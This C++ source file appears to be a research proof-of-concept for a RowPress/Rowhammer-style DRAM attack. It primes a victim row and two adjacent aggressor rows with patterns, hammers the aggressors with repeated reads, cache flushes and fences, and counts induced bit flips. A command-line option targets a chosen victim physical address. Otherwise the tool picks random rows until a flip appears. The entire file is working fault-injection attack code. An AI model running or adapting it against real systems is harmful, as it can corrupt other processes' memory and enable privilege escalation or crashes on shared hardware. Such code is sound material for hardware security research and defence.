#include "../shared.hh"
#include "../params.hh"
#include "../util.hh"
#include <unistd.h>

uint32_t press(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1, uint64_t attacker_virt_addr_2) {
    // prime
    uint8_t *vict_virt_addr_ptr = reinterpret_cast<uint8_t *>(vict_virt_addr);
    uint8_t *attacker_virt_addr_1_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_1);
    uint8_t *attacker_virt_addr_2_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_2);
    memset(vict_virt_addr_ptr, 0x55, ROW_SIZE);
    memset(attacker_virt_addr_1_ptr, 0xAA, ROW_SIZE);
    memset(attacker_virt_addr_2_ptr, 0xAA, ROW_SIZE);
    
    flush_row(vict_virt_addr_ptr);
    flush_row(attacker_virt_addr_1_ptr);
    flush_row(attacker_virt_addr_2_ptr);
  
    for (int iter = 0; iter < PRESS_PER_ITER; iter++) {
        for (int i = 0; i < PRESS_NUM_AGGR_ACTS; i++) {
            for (int j = 0; j < PRESS_NUM_READS; j++) {
                maccess((uint64_t)(attacker_virt_addr_1_ptr + j));
            }

            for (int j = 0; j < PRESS_NUM_READS; j++) {
                maccess((uint64_t)(attacker_virt_addr_2_ptr + j));
            }

            for (int j = 0; j < PRESS_NUM_READS; j++) {
                clflush((uint64_t)(attacker_virt_addr_1_ptr + j));
                clflush((uint64_t)(attacker_virt_addr_2_ptr + j));
            }
            mfence();
        }
    }

    flush_row(vict_virt_addr_ptr);

    uint32_t number_of_bitflips_in_target = count_flips(vict_virt_addr_ptr, 0x55);
    print_result(vict_virt_addr, attacker_virt_addr_1, attacker_virt_addr_2, number_of_bitflips_in_target);
    if (number_of_bitflips_in_target) {
        print_diff(vict_virt_addr_ptr, 0x55);
    }
    return number_of_bitflips_in_target; 
}

void press_all() {
    uint64_t mem_size = 1.8 * BUFFER_SIZE;
    allocated_mem = allocate_pages(mem_size);
    setup_PPN_VPN_map(allocated_mem, mem_size);

    uint64_t victim; 
    uint64_t* attacker_1 = (uint64_t*) calloc(1, sizeof(uint64_t));
    uint64_t* attacker_2 = (uint64_t*) calloc(1, sizeof(uint64_t)); 

    while (true) {
        victim = (uint64_t)((uint8_t *)allocated_mem + ROW_SIZE * (rand() % (mem_size / PAGE_SIZE)));
        // row + 1, row - 1
        if (get_addresses_to_hammer(victim, attacker_1, attacker_2, 1)) {
            uint32_t num_bit_flips = press(victim, *attacker_1, *attacker_2);
            if (num_bit_flips > 0) break;
        }
    }
}

void press_one(uint64_t victim) {
    // allocate only 10% of physical mem
    uint64_t mem_size = 0.1 * BUFFER_SIZE;
    uint64_t* attacker_1 = (uint64_t*) calloc(1, sizeof(uint64_t));
    uint64_t* attacker_2 = (uint64_t*) calloc(1, sizeof(uint64_t)); 

    std::vector<void *> allocated_spaces;

    while (true) {
        allocated_mem = allocate_pages(mem_size);
        setup_PPN_VPN_map(allocated_mem, mem_size);
        allocated_spaces.push_back(allocated_mem);

        // row + 1, row - 1
        if (get_addresses_to_hammer(victim, attacker_1, attacker_2, 1)) {
            for (void *addr: allocated_spaces) {
                deallocate_pages(addr, mem_size);
            }
            try {
                uint32_t num_bit_flips = press(victim, *attacker_1, *attacker_2);
                if (num_bit_flips > 0) break;
            } catch (...) {
                // ignore exceptions and continue
            }
        }
    }
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    
    int opt;
    bool flag_press_all = true;
    uint64_t victim; 
    while((opt = getopt(argc, argv, "hp:")) != -1)  
    {  
        switch(opt)  
        {  
            case 'p':   
                victim = strtol(optarg, NULL, 10);
                flag_press_all = false;
                break; 
            case 'h':
            case '?':
                printf("Usage: %s [-p]\n", argv[0]);
                printf("-p\t specific victim physical address to attack\n");
                printf("If no specific address is passed, it will try to press on random addresses until it finds a bit flip\n");  
                exit(0);
        }  
    }
    if (flag_press_all) {
        press_all();
    } else {
        press_one(victim);
    }
}

